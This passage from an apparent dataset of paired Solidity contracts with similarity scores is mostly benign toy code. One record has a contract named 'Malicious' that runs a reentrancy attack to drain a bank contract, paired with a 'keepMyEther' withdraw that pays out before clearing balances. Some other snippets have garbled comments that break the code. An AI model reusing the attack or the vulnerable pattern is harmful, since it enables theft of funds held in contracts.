        return registry[keccak256(abi.encodePacked(_name))];

    }



    

    

    

    function setAddress(string memory _name, address _userAddress) public isAdmin {

        registry[keccak256(abi.encodePacked(_name))] = _userAddress;

        emit LogSetAddress(_name, _userAddress);

    }

}"
"contract A10test{
 mapping(uint=>string) public data;
 uint public revisionNo=0;


 function setdata(string _data) public {
     data[revisionNo] = _data;
     revisionNo =revisionNo+1;
 }
}",0.5681069638228744,"contract onchain{

    string onChainData;

    function set (string x) public{

        onChainData = x;

    }

    

    function get() public constant returns (string){

        return onChainData;

    }

}"
"contract Testing{

        struct personalInfo {
            uint id;
            string[] colors;
            bool player;
        }

        mapping(uint=> personalInfo) public personals;
        constructor () public {

        }

        function updatePersonalInfo(uint _ID, string memory _color, bool _player) public {
            personalInfo storage updateP = personals[_ID];
            updateP.id = _ID;
            updateP.player = _player;
            updateP.colors.push(_color);
        }
}",0.55044986925758,"contract BaseNeuroDAO {
    struct SpecialTokenHolder {
        uint limit;
        bool isTeam;
    }
    mapping (address => SpecialTokenHolder) public specials;

    struct TokenHolder {
        uint balance;
        uint balanceBeforeUpdate;
        uint balanceUpdateTime;
    }
    mapping (address => TokenHolder) public holders;

    function freezedBalanceOf(address _who) constant public returns(uint);
}"
"contract Votingapp{
  

  mapping (bytes32 => uint256) public votesReceived;

  

  bytes32[] public candidateList;

  
  constructor(bytes32[] memory candidateNames) public {
    candidateList = candidateNames;
  }

  
  function totalVotesFor(bytes32 candidate) view public returns (uint256) {
    require(validCandidate(candidate));
    return votesReceived[candidate];
  }

  
  
  function voteForCandidate(bytes32 candidate) public {
    require(validCandidate(candidate));
    votesReceived[candidate] += 1;
  }

  function validCandidate(bytes32 candidate) view public returns (bool) {
    for(uint i = 0; i < candidateList.length; i++) {
      if (candidateList[i] == candidate) {
        return true;
      }
    }
    return false;
  }
}",0.5629310424869797,"contract ExchangeRate is Ownable {
 
  event RateUpdated(uint timestamp, bytes32 symbol, uint rate);
 
  mapping(bytes32 => uint) public rates;
 
  
  function updateRate(string _symbol, uint _rate) public onlyOwner {
    rates[sha3(_symbol)] = _rate;
    RateUpdated(now, sha3(_symbol), _rate);
  }
 
  
  function updateRates(uint[] data) public onlyOwner {
    if (data.length % 2 > 0)
      return;
    uint i = 0;
    while (i < data.length / 2) {
      bytes32 symbol = bytes32(data[i * 2]);
      uint rate = data[i * 2 + 1];
      rates[symbol] = rate;
      RateUpdated(now, symbol, rate);
      i++;
    }
  }
 
  
  function getRate(string _symbol) public constant returns(uint) {
    return rates[sha3(_symbol)];
  }
 
}"
"contract Bar{

    struct Foo{
        uint x;
        uint y;
    }
    mapping(uint => Foo[]) foo;

    function add(uint id, uint x , uint y)  {
        foo[id].push(Foo(x, y));
    }

    function get(uint id, uint index) public returns(uint, uint){
      
      {
      var a = foo[id][index].x;
      var b = foo[id][index].y;
      }
      return (a,b);
    }

    function get_last_ten(uint id) constant returns(uint[20]){
    uint[20] memory lastItems;
    for(uint i=0;i<20;i++){
        if(foo[id].length>i){
            lastItems[i] = foo[id][foo[id].length-i-1].x;
        }
    }
    return lastItems;
}
}",0.5859504057214155,"contract OtcInterface {

    function getOffer(uint id) public constant returns (uint, ERC20, uint, ERC20);

    function sellAllAmount(ERC20 payGem, uint payAmt, ERC20 buyGem, uint minFillAmount) public returns (uint fillAmt);

    function getBestOffer(ERC20 sellGem, ERC20 buyGem) public constant returns(uint);

    function getWorseOffer(uint id) public constant returns(uint);

    function take(bytes32 id, uint128 maxTakeAmount) public;

}"
"contract Product{  
    struct prod{  
        string name;  
        uint id;  
        bool status;  
    }  
    mapping(uint => prod) public products;

    function updateStudent (string n, uint ID) {
      products[ID].n = ""Temp"";
      products[ID].status = true;
    }
}",0.5720319701774597,"contract ProofOfLove {

    

    uint public count = 0;



    event Love(string name1, string name2);



    constructor() public { }



    function prove(string name1, string name2) external {

        count += 1;

        emit Love(name1, name2);

    }



}"
"contract PublicAddress is Owned{


struct addressStore{
    address[] grantAddresses;
    address accountOwner;
    mapping(address => uint) grantees;
    bool flag;
}


struct accessAddress{
    address[] grantedAddresses;
}


mapping(address => addressStore) StoreMap;


mapping(address => accessAddress) AccessStoreMap;
event addressStoreDetails(address, address, uint, bool, uint);


function setGrantAddress(address[] memory grantees) public returns (bool) {
    StoreMap[msg.sender].accountOwner = msg.sender;
    for(uint i = 0; i< grantees.length; i++){
        if(StoreMap[msg.sender].grantees[grantees[i]] == 0){
        StoreMap[msg.sender].grantAddresses.push(grantees[i]);   
        StoreMap[msg.sender].grantees[grantees[i]] = 1;
        AccessStoreMap[grantees[i]].grantedAddresses.push(msg.sender);
        }
    }
    StoreMap[msg.sender].flag = true;
    return true;
  }


function checkPermission(address _address) external view returns (bool) {
    require(StoreMap[_address].flag == true,""Invalid Address"");
    if(StoreMap[_address].accountOwner == msg.sender){revert(""Sender address same as Owner"");}
    for(uint i =0; i < StoreMap[_address].grantAddresses.length; i++){
        if(StoreMap[_address].grantAddresses[i] == msg.sender){
            return  true;               
        }
     }
  }


function getGrantAddresses() view public returns (address[] memory){
    require(StoreMap[msg.sender].flag == true, ""Invalid Address"");
    require(StoreMap[msg.sender].accountOwner == msg.sender,""Access Denied"");
    return StoreMap[msg.sender].grantAddresses;
  }



function removeGrantee(address _address) public{
    bool grantee = false;
    uint index;
    uint indexk;

    require(StoreMap[msg.sender].flag == true, ""Sender Address mapping does not exist"");

    for (uint i = 0; i < StoreMap[msg.sender].grantAddresses.length; i++){
        if(StoreMap[msg.sender].grantAddresses[i] == _address){
            grantee = true;
            index = i;
            break;
        }
    }

    require(grantee != false,""Address yet not granted access"");
    emit addressStoreDetails(msg.sender, StoreMap[msg.sender].accountOwner, index, grantee, StoreMap[msg.sender].grantAddresses.length-1);
    StoreMap[msg.sender].grantAddresses[index] = StoreMap[msg.sender].grantAddresses[StoreMap[msg.sender].grantAddresses.length-1];
    delete StoreMap[msg.sender].grantAddresses[StoreMap[msg.sender].grantAddresses.length-1];
    StoreMap[msg.sender].grantAddresses.length--;
    delete StoreMap[msg.sender].grantees[_address];

    for (uint k = 0; k < AccessStoreMap[_address].grantedAddresses.length; k++){
        if(AccessStoreMap[_address].grantedAddresses[k] == msg.sender){
            indexk = k;
            break;
        }
    }
    AccessStoreMap[_address].grantedAddresses[indexk] = AccessStoreMap[_address].grantedAddresses[AccessStoreMap[_address].grantedAddresses.length -1];
    delete AccessStoreMap[_address].grantedAddresses[AccessStoreMap[_address].grantedAddresses.length -1];
    AccessStoreMap[_address].grantedAddresses.length--;
 }

function getGrantLength(address _address) public view returns (uint) {
    return StoreMap[_address].grantAddresses.length;
}

function accessableAddresses() view public returns(address[] memory){
    return AccessStoreMap[msg.sender].grantedAddresses;
   }
}",0.5633497022285239,"contract EthTokenToSmthSwaps {



  using SafeMath for uint;



  address public owner;

  uint256 SafeTime = 3 hours; 



  struct Swap {

    address token;

	address targetWallet;

    bytes32 secret;

    bytes20 secretHash;

    uint256 createdAt;

    uint256 balance;

  }



  

  mapping(address => mapping(address => Swap)) public swaps;



  

  



  constructor () public {

    owner = msg.sender;

  }



  event CreateSwap(uint256 createdAt);



  

  

  function createSwap(bytes20 _secretHash, address _participantAddress, uint256 _value, address _token) public {

    require(_value > 0);

    require(swaps[msg.sender][_participantAddress].balance == uint256(0));

    require(ERC20(_token).transferFrom(msg.sender, this, _value));



    swaps[msg.sender][_participantAddress] = Swap(

      _token,

	  _participantAddress,

      bytes32(0),

      _secretHash,

      now,

      _value

    );



    CreateSwap(now);

  }

  

  

  function createSwapTarget(bytes20 _secretHash, address _participantAddress, address _targetWallet, uint256 _value, address _token) public {

    require(_value > 0);

    require(swaps[msg.sender][_participantAddress].balance == uint256(0));

    require(ERC20(_token).transferFrom(msg.sender, this, _value));



    swaps[msg.sender][_participantAddress] = Swap(

      _token,

	  _targetWallet,

      bytes32(0),

      _secretHash,

      now,

      _value

    );



    CreateSwap(now);

  }

  function getBalance(address _ownerAddress) public view returns (uint256) {

    return swaps[_ownerAddress][msg.sender].balance;

  }



  event Withdraw();

  

  function getTargetWallet(address tokenOwnerAddress) public returns (address) {

      return swaps[tokenOwnerAddress][msg.sender].targetWallet;

  }

  

  

  function withdraw(bytes32 _secret, address _ownerAddress) public {

    Swap memory swap = swaps[_ownerAddress][msg.sender];



    require(swap.secretHash == ripemd160(_secret));

    require(swap.balance > uint256(0));

    require(swap.createdAt.add(SafeTime) > now);



    ERC20(swap.token).transfer(swap.targetWallet, swap.balance);



    swaps[_ownerAddress][msg.sender].balance = 0;

    swaps[_ownerAddress][msg.sender].secret = _secret;



    Withdraw();

  }

  

  

  function withdrawNoMoney(bytes32 _secret, address participantAddress) public {

    Swap memory swap = swaps[msg.sender][participantAddress];



    require(swap.secretHash == ripemd160(_secret));

    require(swap.balance > uint256(0));

    require(swap.createdAt.add(SafeTime) > now);



    ERC20(swap.token).transfer(swap.targetWallet, swap.balance);



    swaps[msg.sender][participantAddress].balance = 0;

    swaps[msg.sender][participantAddress].secret = _secret;



    Withdraw();

  }



  

  function getSecret(address _participantAddress) public view returns (bytes32) {

    return swaps[msg.sender][_participantAddress].secret;

  }



  event Refund();



  

  

  function refund(address _participantAddress) public {

    Swap memory swap = swaps[msg.sender][_participantAddress];



    require(swap.balance > uint256(0));

    require(swap.createdAt.add(SafeTime) < now);



    ERC20(swap.token).transfer(msg.sender, swap.balance);

    clean(msg.sender, _participantAddress);



    Refund();

  }



  function clean(address _ownerAddress, address _participantAddress) internal {

    delete swaps[_ownerAddress][_participantAddress];

  }

}"
"contract Student{
    struct stu{
        string name;
        uint age;
        bool tookTest;
    }
    mapping(uint => stu) public studentNames;
    function addStudent (uint ID, string _name, uint _age) {
        studentNames[ID] = stu(_name, _age, false);
    }
    function updateStudent (uint ID) {
        studentNames[ID].tookTest = true;
    }
}",0.5757186602063652,"contract RobetTest {

    string public name;

    mapping (address => mapping (string => uint256)) private bets;

    constructor()  public {

        name = 'RobetTest';

    }

    function insertBet(string memory bid, address addr, uint256 _value) public returns (bool success) {

        bets[addr][bid] = _value;

        return true;

    }

}"
"contract PublishService
{

using strings for *;
struct ServiceListStruct {
string _cloudID;
address _gatewayID;
string _serviceProducerID;
string _serviceProducerMetadata;
string _serviceConsumerMetaAttr;
}
ServiceListStruct[] BCServiceList;

function countEntries() public returns (uint)
{
    return BCServiceList.length;
}

function addEntry(string cloudID, address gatewayID, string spID, string spMetadata, string scMetaAttr) public returns (uint)
{
require(msg.sender==gatewayID);
var sls = ServiceListStruct(cloudID, gatewayID, spID, spMetadata, scMetaAttr);
BCServiceList.push(sls);
return 1;
}

function deleteEntry(string cloudID, address gatewayID, string spID, string spMetadata, string scMetaAttr) public returns (uint)
{
require(msg.sender==gatewayID);
int pos = -1;
for(uint index = 0; index< BCServiceList.length; index++)
{
  if(compareStrings(cloudID, BCServiceList[index]._cloudID))
  {
    if(gatewayID == BCServiceList[index]._gatewayID)
    {
      if(compareStrings(spID, BCServiceList[index]._serviceProducerID))
      {
        if(compareStrings(spMetadata, BCServiceList[index]._serviceProducerMetadata))
        {
          if(compareStrings(scMetaAttr, BCServiceList[index]._serviceConsumerMetaAttr))
          {
            pos = int(index);
          }
        }
      }
    }
  }
}
if(pos > -1)
{
  for(uint i = uint(pos); i < BCServiceList.length -1 ; i++)
  {
    BCServiceList[i] = BCServiceList[i+1];
    delete BCServiceList[BCServiceList.length-1];
    BCServiceList.length--;
  }
return 1;
}
else
return 0;
}

function compareStrings(string s1, string s2) internal returns(bool)
{
var slice1 = s1.toSlice();
var slice2 = s2.toSlice();
var result = slice1.compare(slice2);
if(result == 0)
return true;
else
return false;
}
}",0.5015161013865435,"contract BlocklogyCertificate {
    struct Certificate {
        uint256 userID;
        string name;
        string course;
        uint256 belt;
        uint256 percentile;
    }
    
    address public superAdmin;
    Certificate[] public certificateDatabase;
  
    mapping(address => bool) public isAdmin;

    event CertificateGenerated (
        uint256 _certiID,
        uint256 indexed _userId, 
        string _name, 
        string indexed _course, 
        uint256 indexed _belt,
        uint256 _percentile
    );

    modifier onlyAdmin() {
        require(isAdmin[msg.sender], ""Only Admin assigned by SuperAdmin can use this function"");
        _;
    }
      
    modifier onlySuperAdmin() {
        require(msg.sender == superAdmin, ""Only SuperAdmin can use this function"");
        _;
    }

    constructor() public {
        superAdmin = msg.sender;
        isAdmin[msg.sender] = true;
    }
    
    
    
    function addAdmin(address _adminAddress) public onlySuperAdmin {
        isAdmin[_adminAddress] = true;
    }
    
    
    
    function removeAdmin(address _adminAddress) public onlySuperAdmin {
        isAdmin[_adminAddress] = false;
    }
    
    
    
    function viewLatestCertificateNumber() public view returns (uint256) {
        return certificateDatabase.length-1;
    }
    
    
    
    function getTotalCertificateCount() public view returns (uint256) {
        return certificateDatabase.length;
    }
    
    
    
    
    
    
    
    
    function issueCertificate(
        uint256 _userId, 
        string memory _name, 
        string memory _course, 
        uint256 _belt, 
        uint256 _percentile
    ) public onlyAdmin returns (uint256) {
        certificateDatabase.push(Certificate({
            userID: _userId,
            name: _name,
            course: _course,
            belt: _belt,
            percentile: _percentile
        }));
        
        emit CertificateGenerated(
            certificateDatabase.length - 1, 
            _userId, 
            _name, 
            _course, 
            _belt, 
            _percentile
        );

        return certificateDatabase.length - 1;
    }
}"
"contract MemberStruct {
    struct Member {
        uint256 challengeID;    
        
        
        uint256 membershipStartTime;
    }
}",0.5152345390124341,"contract IWingsController {
    uint256 public ethRewardPart;
    uint256 public tokenRewardPart;
}"
"contract SampleContract {
struct ChildStruct {
    bool isPresent;
    bytes32 name;
}

struct ParentStruct {
    bool isPresent;
    bytes32 name;
    
}

mapping(bytes32 => ParentStruct) sampleStructs;

function insertData(bytes32 parentAddress, bytes32 parentName
                       
                       )
public returns(bool success)
{
    ParentStruct storage c = sampleStructs[parentAddress];
    c.isPresent = true;
    c.name = parentName;
    
    return true;
}

function validate(bytes32 parentAddress)
public returns(bool isPresent, string name) 
{
    return 
    (sampleStructs[parentAddress].isPresent,
    bytes32ToString(sampleStructs[parentAddress].name)
    );
}

function bytes32ToString(bytes32 x) constant returns (string) 
{
    bytes memory bytesString = new bytes(32);
    uint charCount = 0;
    for (uint j = 0; j < 32; j++) {
        byte char = byte(bytes32(uint(x) * 2 ** (8 * j)));
        if (char != 0) {
            bytesString[charCount] = char;
            charCount++;
        }
    }
    bytes memory bytesStringTrimmed = new bytes(charCount);
    for (j = 0; j < charCount; j++) {
        bytesStringTrimmed[j] = bytesString[j];
    }
    return string(bytesStringTrimmed);
}
}",0.5889255167777038,"contract Strings {

  

  function Concatenate(string memory a, string memory b) public pure returns (string memory concatenatedString) {

    bytes memory bytesA = bytes(a);

    bytes memory bytesB = bytes(b);

    string memory concatenatedAB = new string(bytesA.length + bytesB.length);

    bytes memory bytesAB = bytes(concatenatedAB);

    uint concatendatedIndex = 0;

    uint index = 0;

    for (index = 0; index < bytesA.length; index++) {

      bytesAB[concatendatedIndex++] = bytesA[index];

    }

    for (index = 0; index < bytesB.length; index++) {

      bytesAB[concatendatedIndex++] = bytesB[index];

    }



    return string(bytesAB);

  }



  function UintToString(uint value) public pure returns (string memory uintAsString) {

    uint tempValue = value;



    if (tempValue == 0) {

      return ""0"";

    }

    uint j = tempValue;

    uint length;

    while (j != 0) {

      length++;

      j /= 10;

    }

    bytes memory byteString = new bytes(length);

    uint index = length - 1;

    while (tempValue != 0) {

      byteString[index--] = byte(uint8(48 + tempValue % 10));

      tempValue /= 10;

    }

    return string(byteString);

  }

}"
"contract Malicious {
   uint balance;
   MyBank bank = MyBank(0xdeadbeef8badf00d...);
function Malicious(){
   balance = msg.value;
   bank.Deposit.value(balance)();
   bank.Withdraw.value(0)(balance); 
}
function (){ 
   bank.Withdraw.value(0)(balance);
}
}",0.5379782118428107,"contract keepMyEther {
    mapping(address => uint256) public balances;
    
    function () payable public {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        msg.sender.call.value(balances[msg.sender])();
        balances[msg.sender] = 0;
    }
}"
"contract Person {
    uint id;
    bytes firstName;
    bytes lastName;
}",0.5795030004257946,"contract VatLike {
    function file(bytes32, bytes32, uint) external;
}"
"contract SimpleStorage {
  mapping(address => Pass[]) passes; 

  struct Pass{
      string class_name;
      string first_name;
      string last_name;
  }

  function submitPass(string classname, string firstname, string lastname){
      passes[msg.sender].push(Pass({
          class_name: classname,
          first_name: firstname,
          last_name:  lastname
      }));
  }

}",0.5601514329252777,"contract Certificate {
    string classDate; 
    string participants;
    string location;
    address certificateManager;
    
    function Certificate(string _classDate, string _participants, string _location) {
        classDate = _classDate;
        participants = _participants;
        certificateManager = msg.sender;
        location = _location;
    }
}"
"contract C {

    bytes32 d=keccak256(0x616263);

    bytes32 a=sha3(uint256(1));
}",0.5304028384336743,"contract VatLike {
    function file(bytes32, bytes32, uint) external;
}"
"contract DECatalogue
{
    address owner;
    string public name;
    mapping (string => address) dataEntities;
    string[] public dataEntityNames;
    uint public lineageInfoCount = 0;
    uint count = 0;
    uint public notificationCount = 0;
    mapping(uint => Lineage) public lineageInfo;

    struct Lineage
    {
        string name;
        string[] sources;
        string annotations;
    }

    constructor() public
    {
        name = ""DataEntityCatalogue Master Contract"";
        owner = msg.sender;
    }

    function createNewDataEntity(string memory _name, string[] memory _dataEntities, string memory _date, string memory _fileName, string memory _annotations) public{
        DataEntityContract instance = new DataEntityContract(_name,_dataEntities, _date, _fileName);
        DataEntitiesCount++;
        dataEntityNames.push(_name);
        dataEntities[_name]=address(instance);
    }

    function getLineage(string memory _name) public payable{
        DataEntityContract de = DataEntityContract(dataEntities[_name]);
        string[] memory sources = de.getSources();
        lineageInfo[count] = Lineage(de.getName(), sources, de.getAnnotations());
        count++;
        if(sources.length==0){
            return;
        }
        else{
            for(uint i=0;i<sources.length;i++){
                getLineage(sources[i]);
            }
        }
        lineageInfoCount = count;
        count=0;
    }
}",0.5220864697600699,"contract BiddingBase is Pausable

{

    uint40 public minTime = 60*10;

    uint public minBid = 50 finney - 1 szabo;



    address public operatorAddress;



    

    mapping(address => uint) public pendingReturns;

    uint public totalReturns;



    event Withdraw(address indexed bidder, uint256 value);



    

    function withdraw() public {

        uint amount = pendingReturns[msg.sender];

        require (amount > 0);



        

        

        



        totalReturns -= amount;

        pendingReturns[msg.sender] -= amount;



        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);

    }



    function destroyContract() public onlyOwner {



        selfdestruct(msg.sender);

    }



    function withdrawEthFromBalance() external onlyOwner

    {

        owner.transfer(address(this).balance - totalReturns);

    }



    function setOperator(address _operator) public onlyOwner

    {

        operatorAddress = _operator;

    }



    function setMinBid(uint _minBid) public onlyOwner

    {

        minBid = _minBid;

    }



    function setMinTime(uint40 _minTime) public onlyOwner

    {

        minTime = _minTime;

    }



    modifier onlyOperator() {

        require(msg.sender == operatorAddress || msg.sender == owner);

        _;

    }



    function isContract(address addr) public view returns (bool) {

        uint size;

        assembly { size := extcodesize(addr) }

        return size > 0;

    }

}"
"contract Monopoly {

string public player1;
uint32 public player2;
uint32 public player3;

    constructor(string memory _player1, uint32 _player2, uint32 _player3) public {
    player1 = _player1;
    player2 = _player2;
    player3 = _player3;
    }
}",0.5480682527417101,"contract DetailedERC20 {

  string public name;

  string public symbol;

  uint8 public decimals;



  constructor(string memory _name, string memory _symbol, uint8 _decimals) public {

    name = _name;

    symbol = _symbol;

    decimals = _decimals;

  }

}"
"contract Person {
struct edu {
string title;
string institute;
string date;
string details;
}
edu[] public education;
constructor (string[] title, string[] institute, string[] date, string[] 
details                         
) public {
for (uint i=0; i<title.length; i++)
edu memory newEdu = edu({
title : title[i],
institute : institute[i],
date : date[i],
details : details[i]
});
}
}",0.5844319085653663,"contract Marcela_Birthday {


string public name ;

string public date;

string public hour;

string public local;


function Marcela_Birthday(string _name, string _date, string _hour ,string _local){
name = _name;
date = _date;
hour = _hour;
local = _local;
}


function getinfo () public constant returns (string,string,string,string) {
    
 return(name,date,hour,local);
}
}"
"contract Utils{
   event HashedData(bytes32);

   function getHash(bytes32 data) public pure returns(bytes32){
       return keccak256(abi.encodePacked(data));
   }

   function checkHash(bytes32 hash, bytes32 data) public returns(bool){
        bytes32 hashedData = getHash(data);
        emit HashedData(hashedData);
        return hash==hashedData;
    }
}",0.5559417033969479,"contract GlobalConstraintInterface {



    enum CallPhase { Pre, Post,PreAndPost }



    function pre( address _scheme, bytes32 _params, bytes32 _method ) public returns(bool);

    function post( address _scheme, bytes32 _params, bytes32 _method ) public returns(bool);

    

    function when() public returns(CallPhase);

}"
"contract B{
     A instance = new A();

     function wrapper_someMethod() public{
          instance.someMethod();
     }
}",0.566499964128495,"contract RGX {
    function balanceOf(address _owner) public view returns (uint256 balance);
}"
"contract Test2 {

    function Test2s() public{  
        int t = test() ;  
    }

    function test() public returns (int c){
        address addr = address(0xFbdCc***************************6 );  
         bytes4 sig = bytes4(keccak256(""function()"")); 

         assembly {
        let x := mload(0x40)   
        mstore(x,sig) 

        let success := call(      
                            500000, 
                            addr, 
                            0,    
                            x,    
                            0x00, 
                            x,    
                            0x20) 

        c := mload(x) 
        mstore(0x40,add(x,0x44)) 
    }
    }
}",0.5784776204729852,"contract IERC223Basic {

  function balanceOf(address _owner) public constant returns (uint);

  function transfer(address _to, uint _value) public;

  function transfer(address _to, uint _value, bytes _data) public;

  event Transfer(

    address indexed from,

    address indexed to,

    uint value,

    bytes data

  );

}"
"contract Unique {

    string sm;
    string bm;
    bytes32 val;
    bytes32 vm;

    function hk(string s, string y, bytes32 i)returns (bytes32){
        sm =s;
        bm =y;
        vm =i;
        val = sha3(sm,bm,vm);
    }

    function getOut()constant returns (bytes32){
        return val;
    }
}",0.5872812380521224,"contract Ambi {
    function getNodeAddress(bytes32 _name) constant returns (address);
    function addNode(bytes32 _name, address _addr) external returns (bool);
    function hasRelation(bytes32 _from, bytes32 _role, address _to) constant returns (bool);
}"
"contract token{ 
    struct video { address vidAddress; string title; uint initialSupply; } 
    mapping(address=>video)videos; 
    function add(address vidAddress,string title,uint initialSupply){ 
    video memory v; 
    v.vidAddress=vidAddress; 
    v.title=title; 
    v.initialSupply=initialSupply; 
    videos[vidAddress]=v; 
    } 
}",0.5258232006717212,"contract ABCToken is ERC223Token {
    
    function ABCToken(
            string _name,
            string _symbol,
            uint8 _decimals,
            uint256 _totalSupply,
            address _initialTokensHolder) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply;
        balances[_initialTokensHolder] = _totalSupply;
    }
}"
"contract Register{

 struct Details{
    bytes id;
    string name;
    string age;
   string country;
 }
 mapping (bytes => Details) DetailsTable;

bytes[] uid;

 function saveBondToBC(bytes id,string name,string age,string country) payable returns(bool success){

DetailsTable[id].id = id;
DetailsTable[id].name = name;
DetailsTable[id].age = age;
DetailsTable[id].country = country;
return true;

}


function insertID(bytes id) payable returns(bool success){

uid.push(id);
return true;

}

function getAllID() public returns(bytes[]){

    return uid;

}

}",0.5652227937514265,"contract OpenSeaENSResolver is Ownable {

  string private _baseURI = ""https:



  function baseURI() public view returns (string memory) {

    return _baseURI;

  }



  function setBaseURI(string memory uri) public onlyOwner {

    _baseURI = uri;

  }



  function openSeaVersion() public pure returns (string memory) {

    return ""1.0.0"";

  }



  function text(bytes32 node, string memory key) public view returns (string memory) {

    if (keccak256(bytes(key)) == keccak256(bytes(""url""))) {

      return Strings.strConcat(_baseURI, Strings.uint2str(uint256(node)));

    }

    return """";

  }

}"
"contract TestCalls {

    uint public lastMsgDataLength;
    uint public lastMsgValue;

    modifier setMsgFields {
        lastMsgDataLength = msg.data.length;
        lastMsgValue = msg.value;
        _;
    }

    constructor() setMsgFields public {
    }
}",0.5309125126759826,"contract Ownable {

    address public owner;



    

    constructor() public {

        owner = msg.sender;

    }



    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

    

        

    modifier onlyPayloadSize(uint size) {

        assert(msg.data.length >= size + 4);

        _;

    }

}"
"contract CrowdFactory{

    uint nbrProjetTotal;

    using sharedLib for sharedLib.Client ; 
    using sharedLib for sharedLib.Projet;




     mapping(address => ClientSC) public usersinfo;  
    donn锟絜s des utilisateurs 
     mapping (uint=> projetSC)public projectsinfo; 
  des projets 
    

    address[] public users; 
 (wallet)
    address[] public clients;
    address[] public Projects; 
      crowdfunding.dapp.crowdfundingdapp.contracts des projet cr锟絜s

      
     constructor ()public {

     }


      



event registred(address contractAddress, address publickey, uint userId ) ;
event projectAdded(address contractAddress, address porteur, uint pID ) ;
event loggedin(address publickey , uint userId);
      





            
       -----------------------------------------
    
    function isRegistred (address _userAddress) 
    internal 
    view   
    returns(bool){
           for(uint256 i = 0; i < users.length; i++){
                if(users[i] == _userAddress) return true;
                else         return false;

           }             
    }

   
     ------

   function Registration (uint _userId,  string memory _mail ,string 
 memory _password)   
   public
   returns (ClientSC newClient )
     {   require (!isRegistred(msg.sender));
                ClientSC newClient = new ClientSC  ( _userId, _mail , _password);
                usersinfo[msg.sender]= newClient;
                users.push(msg.sender);
                clients.push(address (newClient));
                emit registred(address(newClient),msg.sender, _userId);
                return (newClient) ;
   } 


    function appNewProject (address adr) 
    public
    returns(bool)
    {
     projetSC Project = projetSC(adr);
     if (Project.getProjectState () ==sharedLib.ProjectStatus.Waiting)
     {
         if(Project.getProjectDateFin() <= Project.getProjectDateDebut())
           {  Project.setProjectState(sharedLib.ProjectStatus.Refused);
              return false;

           }else 
           {
            Project.setProjectState(sharedLib.ProjectStatus.Active);
            Projects.push(Project.getProjectContractAddress());        
            nbrProjetTotal =Projects.length;
            projectsinfo[nbrProjetTotal]=Project;

            return true;

         } 
      }

    } 


    function getProject(address adr) public view returns(uint, address){
         projetSC Project = projetSC(adr);
         return (Project.getProjectDateFin (), Project.getProjectContractAddress());
    }







}",0.5632212796318531,"contract BaseContract is VTM {

	using SafeMath

	for * ;



	string public name;

	string public symbol;

	uint8 public decimals;

	uint256 public totalSupply;

	mapping(address => uint256) public balanceOf;

	mapping(address => mapping(address => uint256)) public allowance;



	mapping(address => address[]) public affs;

	mapping(address => address) public aff;

	mapping(address => bool) public airAddrs;



	function BaseContract(

		uint256 _totalSupply,

		string _name,

		uint8 _decimal,

		string _symbol

	) {

		totalSupply = _totalSupply;

		name = _name;

		symbol = _symbol;

		decimals = _decimal;

		balanceOf[msg.sender] = _totalSupply;

		aff[msg.sender] = msg.sender;

		airAddrs[msg.sender] = true;

	}



	function transfer(address _to, uint256 _value) public returns(bool success) {

		require(_to != 0x0, ""invalid addr"");

		balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);

		balanceOf[_to] = balanceOf[_to].add(_value);

		emit Transfer(msg.sender, _to, _value);

		if(_value > 0 && aff[_to] == address(0) && msg.sender != _to) {

			aff[_to] = msg.sender;

			affs[msg.sender].push(_to);

			airAddrs[_to] = true;

		}

		return true;

	}



	function approve(address _spender, uint256 _value) public returns(bool success) {

		require(_spender != 0x0, ""invalid addr"");

		require(_value > 0, ""invalid value"");

		allowance[msg.sender][_spender] = _value;

		return true;

	}



	function transferFrom(address _from, address _to, uint256 _value) public returns(bool success) {

		require(_from != 0x0, ""invalid addr"");

		require(_to != 0x0, ""invalid addr"");

		balanceOf[_from] = balanceOf[_from].sub(_value);

		balanceOf[_to] = balanceOf[_to].add(_value);

		allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);

		emit Transfer(_from, _to, _value);

		return true;

	}



	function getAff(address _addr)

	public

	view

	returns(address) {

		return aff[_addr];

	}

	

	function getAffLength(address _addr)

	public

	view

	returns(uint256) {

		return affs[_addr].length;

	}



	function isAirAddr(address _addr)

	public

	view

	returns(bool) {

		return airAddrs[_addr];

	}



}"
"contract SimpleStorage {
  bytes input;
  function setInput(bytes enterBytes){
    input = enterBytes;
  }
}",0.5765809417232606,"contract HelloWorld {
    
    function greeter (bytes32 input) returns (bytes32 output) {
        return input;
    }

}"
"contract Betting {

    struct Bet{
        uint betId;
        string question;
        BetStatus betStatus;
        mapping(uint => MoneyLineDatum) moneyLineData;
        uint lengthMoneyLineData;
    }

    struct MoneyLineDatum{
        string option;
        int value; 
    }

    address public owner = msg.sender;

    mapping(uint => Bet) public bets;
    uint public lengthBets;
    enum BetStatus {Open, Closed}

    constructor() public{
        string[2] memory options = [""Gator"", ""Miami""];
        int[2] memory values = [int(200), -100];
        addBet(""Gator vs Miami"", options, values);

        options = [""Gator"", ""Georgia""];
        values = [int(200), -150];
        addBet(""Gator vs Georgia"", options, values);
    }

    modifier onlyBy(address account){
        require(msg.sender == account, ""Unauthorised Access"");
        _;
    }

    function addNewEmptyBet() public{
        Bet memory bet;
        bets[lengthBets] = bet;
    }

    function addBet(string memory question, string[2] memory options, int[2] memory values) public onlyBy(owner){
        addNewEmptyBet();
        Bet storage bet = bets[lengthBets];
        bet.betId = lengthBets;
        bet.question = question;
        bet.betStatus = BetStatus.Open;
        lengthBets+=1;
        for(uint i=0; i<options.length; i++){
            bet.moneyLineData[i] = MoneyLineDatum(options[i], values[i]);
        }
        bet.lengthMoneyLineData+=options.length;
    }

    function getLengthMoneyLineData(uint betId) public view returns(uint){
        return bets[betId].lengthMoneyLineData;
    }

    function getMoneyLineData(uint betId, uint idx) public view returns(string memory, int){
        MoneyLineDatum storage moneyLineDatum = bets[betId].moneyLineData[idx];
        return (moneyLineDatum.option, moneyLineDatum.value);
    }
}",0.5429259445644247,"contract UbexContract {

    address public owner = msg.sender;

    modifier onlyBy(address _account)

    {

        require(

            msg.sender == _account,

            ""Sender not authorized.""

        );

        _;

    }



    struct RequestsIndex {

        address addr;

        bool isEntity;

        uint256 amount;

        bytes32 hash;

    }

	

	event requestAdded(

        uint indexed _id,

        address _addr,

        uint _amount

    );

	

	event requestUpdated(

		uint indexed _id,

        address indexed _addr,

        bytes32 _hash

    );

	

    

